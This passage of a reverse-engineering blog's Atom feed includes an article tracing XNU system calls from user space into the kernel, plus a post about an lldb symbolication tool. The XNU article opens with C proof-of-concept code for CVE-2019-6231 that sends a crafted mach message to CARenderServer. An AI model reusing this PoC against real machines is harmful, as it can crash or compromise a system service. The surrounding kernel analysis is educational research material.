style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-04-19T11:32:58.508Z</updated>
    
